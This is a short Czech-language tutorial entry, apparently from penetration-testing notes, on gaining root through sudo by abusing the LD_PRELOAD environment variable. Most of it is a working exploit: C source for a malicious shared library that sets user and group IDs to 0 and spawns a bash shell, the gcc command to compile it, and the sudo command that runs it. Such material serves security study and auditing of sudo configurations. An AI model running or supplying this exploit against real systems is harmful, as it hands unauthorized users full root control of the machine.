Privilege escalation pomocí sudo a LD_PRELOAD využívá možnost vložit vlastní knihovnu před spuštěním programu. Útočník vytvoří škodlivou sdílenou knihovnu, která například spustí shell s vyššími právy, nastaví proměnnou prostředí LD_PRELOAD na tuto knihovnu a spustí povolený příkaz přes sudo.

### Ukázka:
Vytvořte knihovnu (`exploit.c`):
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
void _init(){
	unsetenv("LD_PRELOAD");
	setuid(0);
	setgid(0);
	system("/bin/bash");
}
```

Kompilujte:
```bash
$ gcc -fPIC -shared -o /cesta/k/exploit.so exploit.c -nostartfiles
```

Spusťte exploit:
```bash
$ sudo LD_PRELOAD=/cesta/k/exploit.so /usr/bin/<program>
```